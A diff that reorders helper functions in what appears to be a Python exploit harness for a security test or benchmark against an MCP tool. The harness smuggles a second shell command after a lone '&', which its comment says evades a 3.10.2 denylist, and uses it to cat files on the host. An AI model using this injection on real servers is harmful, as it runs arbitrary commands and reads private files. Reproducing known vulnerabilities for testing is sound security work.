@@ -43,16 +43,6 @@ AIM = re.compile(r" & ")  # the injection separator the benign call never carrie
 Exploit = Callable[[Places, MCPClientPort], Awaitable[None]]
 
 
-def _inject(payload: str) -> str:
-    # The lone `&` is what the 3.10.2 denylist misses and 3.10.3 blocks: a harmless adb token is
-    # backgrounded and the real payload runs in the host shell.
-    return f"probe & {payload}"
-
-
-async def _shell(client: MCPClientPort, payload: str) -> None:
-    await client.call_tool(TOOL, {"command": _inject(payload)})
-
-
 def _cat(place_id: str) -> Exploit:
     async def exploit(places: Places, client: MCPClientPort) -> None:
         coords = places[place_id].coordinates
@@ -63,6 +53,16 @@ def _cat(place_id: str) -> Exploit:
         await _shell(client, f"cat {resolve_container_path(raw, HOME)}")
 
     return exploit
+
+
+async def _shell(client: MCPClientPort, payload: str) -> None:
+    await client.call_tool(TOOL, {"command": _inject(payload)})
+
+
+def _inject(payload: str) -> str:
+    # The lone `&` is what the 3.10.2 denylist misses and 3.10.3 blocks: a harmless adb token is
+    # backgrounded and the real payload runs in the host shell.
+    return f"probe & {payload}"
 
 
 def _fetch(place_id: str) -> Exploit:
